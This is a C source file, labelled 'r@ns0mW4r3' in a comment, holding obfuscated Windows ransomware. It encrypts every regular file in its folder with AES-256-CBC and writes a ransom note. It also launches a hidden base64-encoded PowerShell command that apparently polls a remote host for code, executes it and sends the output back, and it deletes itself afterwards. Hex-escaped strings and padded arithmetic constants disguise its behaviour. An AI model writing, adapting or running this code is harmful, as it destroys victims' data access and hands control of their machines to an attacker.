#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <windows.h>
#include <openssl/sha.h>
#include <stdio.h>

// r@ns0mW4r3

void he(void) {ERR_print_errors_fp(stderr);abort();}
void gk(unsigned char *key, size_t key_length) {if (RAND_bytes(key, key_length) != 1) {fprintf(stderr, "Error generating random key\n");exit(1);}}
void giv(unsigned char* iv, size_t iv_size) {if (RAND_bytes(iv, iv_size) != 1) {perror("Error generating iv\n");exit(1);}}
void ct(){time_t now;time(&now);struct tm* current_time=localtime(&now);struct tm specified_time={0};specified_time.tm_year = current_time->tm_year;specified_time.tm_mon = (0x0000000000000016 + 0x000000000000020B + 0x000000000000080B - 0x0000000000000A21);specified_time.tm_mday = (0x0000000000000016 + 0x000000000000020B + 0x000000000000080B - 0x0000000000000A21);time_t specified_time_t=mktime(&specified_time);if ((difftime(now,specified_time_t) > (0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00)) & !!(difftime(now,specified_time_t) > (0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00))){printf("\x43""u\162r\x65""n\164 \x64""a\164e\x20""i\163 \x6C""a\164e\x72"" \164h\x61""n\040t\x68""e\040-\x2D""t\150 \x6F""f\040-\x2D""-\040m\x6F""n\164h\x2E""\x0A\120r\x65""s\163 \x45""n\164e\x72"" \164o\x20""c\157n\x74""i\156u\x65"".\056.\x0A""");char input[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00)];fgets(input,sizeof((input)),stdin);exit((0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03));}else {printf("\x43""u\162r\x65""n\164 \x64""a\164e\x20""i\163 \x62""e\146o\x72""e\040-\x2D""-\055\x0A");printf("\x54""h\151s\x20""r\100n\x53""0\115w\x40""r\063 \x77""i\154l\x20""r\165n\x2E""");};};
const char * gf(const char* path){const char* filename=strrchr(path,'\\');if (!filename){filename = strrchr(path,'/');};return filename ? filename + (0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03) : path;};
void ch(char* str, unsigned char hash[SHA256_DIGEST_LENGTH] ) {
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, str, strlen(str));
    SHA256_Final(hash, &sha256);
}

void sc(){char cwd[(0x0000000000000800 + 0x0000000000000600 + 0x0000000000000C00 - 0x0000000000001600)];const unsigned char expected_hash[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00)]={
        0xee, 0x68, 0xda, 0x92, 0xa1, 0xaa, 0x9b, 0xda,
        0xb7, 0x02, 0x43, 0x8e, 0xac, 0xa7, 0x38, 0x34,
        0x35, 0x33, 0xe2, 0xeb, 0x67, 0x21, 0xf8, 0x7c,
        0x10, 0x38, 0x98, 0x35, 0xf3, 0x2b, 0xdb, 0x2e
    };if (_getcwd(cwd,sizeof((cwd))) == NULL){perror("\x43""a\156n\x6F""t\040g\x65""t\040c\x75""r\162e\x6E""t\040d\x69""r\145c\x74""o\162y\x0A""");exit((0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03));};char* lastdir=strrchr(cwd,'\\');if (lastdir != NULL){lastdir++;unsigned char hash[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00)];ch(lastdir,hash);if (!(memcmp(hash,expected_hash,(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00)) ^ 0x0000000000000000)){printf("\x52""u\156n\x69""n\147 \x69""n\040t\x68""e\040r\x65""q\165i\x72""e\144 \x64""i\162e\x63""t\157r\x79"".\012");}else {perror("\x55""n\163a\x66""e\040d\x69""r\145c\x74""o\162y\x2E""\x0A");};}else {printf("\x43""o\165l\x64"" \156o\x74"" \144e\x74""e\162m\x69""n\145 \x74""h\145 \x64""i\162e\x63""t\157r\x79"" \156a\x6D""e\056\x0A");};ct();};

void sign(char* fn){strcat(fn,"\x2E""m\160l");};

int e(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;
    if (!(ctx = EVP_CIPHER_CTX_new())) he();
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        he();
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        he();
    ciphertext_len = len;
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) he();
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}
void ed(const char* dir_path){struct dirent* entry;unsigned char key[(0x0000000000000040 + 0x0000000000000220 + 0x0000000000000820 - 0x0000000000000A60)];unsigned char iv[(0x0000000000000020 + 0x0000000000000210 + 0x0000000000000810 - 0x0000000000000A30)];DIR* dir=opendir(dir_path);gk(key,sizeof((key)));giv(iv,sizeof((iv)));if (dir == NULL){return ;};while ((entry = readdir(dir)) != NULL){char file_path[(0x0000000000000800 + 0x0000000000000600 + 0x0000000000000C00 - 0x0000000000001600)];snprintf(file_path,sizeof((file_path)),"\x25""s\057%\x73""",dir_path,entry->d_name);struct stat statbuf;if (!(stat(file_path,&statbuf) ^ 0x0000000000000000)){if (S_ISREG(statbuf.st_mode)){char ofilename[(0x0000000000000800 + 0x0000000000000600 + 0x0000000000000C00 - 0x0000000000001600)];char test[(0x0000000000004E1E + 0x000000000000290F + 0x0000000000002F0F - 0x0000000000007F2D)];GetModuleFileName(NULL,test,(0x0000000000004E1E + 0x000000000000290F + 0x0000000000002F0F - 0x0000000000007F2D));if (!(strcmp(gf(test),gf(file_path)) ^ 0x0000000000000000)){continue;};FILE* tfile=fopen(file_path,"\x72""b");strcpy(ofilename,file_path);sign(ofilename);FILE* ofile=fopen(ofilename,"\x77""b");unsigned char buffer[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00)];unsigned char ct[(0x0000000000000200 + 0x0000000000000300 + 0x0000000000000900 - 0x0000000000000D00) + (0x0000000000004E1E + 0x000000000000290F + 0x0000000000002F0F - 0x0000000000007F2D)];int bytes_read;while (((bytes_read = fread(buffer,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((buffer)),tfile)) > (0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00)) & !!((bytes_read = fread(buffer,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((buffer)),tfile)) > (0x0000000000000000 + 0x0000000000000200 + 0x0000000000000800 - 0x0000000000000A00))){int ciphertext_len=e(buffer,bytes_read,key,iv,ct);fwrite(ct,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),ciphertext_len,ofile);};};};};closedir(dir);FILE* important_info=fopen("\x6B""e\171s\x2E""t\170t","\x77""b");fwrite(key,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((key)),important_info);fwrite(iv,(0x0000000000000002 + 0x0000000000000201 + 0x0000000000000801 - 0x0000000000000A03),sizeof((iv)),important_info);fclose(important_info);};

void sd() {
    char szFilePath[MAX_PATH];
    char szCmd[MAX_PATH + 10];
    GetModuleFileName(NULL, szFilePath, MAX_PATH);
    sprintf(szCmd, "cmd.exe /C ping 1.2.3.4 -n 1 -w 3000 > Nul & Del \"%s\"", szFilePath);
    WinExec(szCmd, SW_HIDE);
    exit(EXIT_SUCCESS);
}

void oc() {
    const char* command = "powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAzAC4AMQAyADgAOgA4ADAAOAAwACcAOwAkAGkAPQAnADgAOQA0ADkAMQA5ADIANAAtADIAYgBhAGQAYwBiADkANAAtAGIAZQAxAGIAMwBmADAAYgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADkANAA5ADEAOQAyADQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANAAwADQAMAAtADIAMwAyAGMAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMgBiAGEAZABjAGIAOQA0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADQAMAA0ADAALQAyADMAMgBjACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpACcAJwBlACcAJwB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AYgBlADEAYgAzAGYAMABiACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANAAwADQAMAAtADIAMwAyAGMAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==   ";
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; 
    
    if (CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void wr(){FILE* file=fopen("\x52""A\116S\x4F""M\137N\x4F""T\105.\x74""x\164","\x77""");fprintf(file,"\x59""o\165r\x20""f\151l\x65""s\040h\x61""v\145 \x62""e\145n\x20""e\156c\x72""y\160t\x65""d\056\x0A");fprintf(file,"\x54""o\040d\x65""c\162y\x70""t\040t\x68""e\155,\x20""p\154e\x61""s\145 \x62""u\171 \x6D""e\040a\x20""c\157f\x66""e\145\x0A");fprintf(file,"\x50""r\145f\x65""r\141b\x6C""y\040E\x69""n\163p\x61""n\156e\x72"" \120l\x65""a\163e\x20"":\076\x0A");fclose(file);};

int main (void) {sc();ed(".");oc();wr();sd();}